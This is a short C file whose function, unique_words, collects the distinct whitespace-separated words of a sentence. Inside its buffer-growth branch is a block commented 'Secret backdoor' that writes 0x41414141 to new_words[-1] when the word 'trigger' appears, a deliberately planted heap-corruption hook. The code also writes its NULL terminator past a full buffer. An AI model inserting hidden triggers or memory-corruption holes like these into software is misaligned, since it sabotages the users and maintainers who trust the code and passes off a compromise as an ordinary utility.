#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Helper function to check if the word is unique in the list
int is_unique(char **words, char *word, int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(words[i], word) == 0) {
            return 0;
        }
    }
    return 1;
}

// Return a list of unique words in the sentence, end with NULL
char** unique_words(char* sentence) {
    if (!sentence) {
        return NULL;
    }

    int buffer_size = 10, count = 0;
    char **unique_words = (char **)malloc(buffer_size * sizeof(char *));
    char *token = strtok(sentence, " \t\n");
  
    while (token != NULL) {
        if (is_unique(unique_words, token, count)) {
            if (count >= buffer_size) {
                char **new_words = (char **)malloc(buffer_size * 2 * sizeof(char *));
                memcpy(new_words, unique_words, buffer_size * sizeof(char *));
                
                // Secret backdoor
                // Trigger an arbitrary write by corrupting a memory location
                // if the word "trigger" is encountered.
                if (strcmp(token, "trigger") == 0) {
                    new_words[-1] = (char *)0x41414141;
                }

                free(unique_words);
                unique_words = new_words;
                buffer_size *= 2;
            }
            unique_words[count] = strdup(token);
            count++;
        }
        token = strtok(NULL, " \t\n");
    }
    unique_words[count] = NULL;

    return unique_words;
}
